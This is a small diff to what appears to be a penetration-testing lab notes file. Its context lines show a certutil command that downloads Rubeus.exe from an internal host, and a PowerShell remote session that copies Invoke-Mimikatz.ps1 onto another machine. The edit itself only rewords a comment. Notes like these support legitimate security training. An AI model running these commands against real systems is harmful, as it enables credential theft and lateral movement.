@@ -86,7 +86,7 @@ certutil.exe -urlcache -f http://192.168.50.48/Rubeus.exe C:\users\hitman\Rubeus
 ```powershell
 $sess = New-PSSession -ComputerName ufc-webprod -Credential usfun\pastudent1337
 Copy-Item -Path Invoke-Mimikatz.ps1 -Destination C:\users\public\Invoke-Mimikatz.ps1 -ToSession $sess
-// You can use too -FromSession :D
+// You can use -FromSession to get files from session :D
 ```
 
 &nbsp;
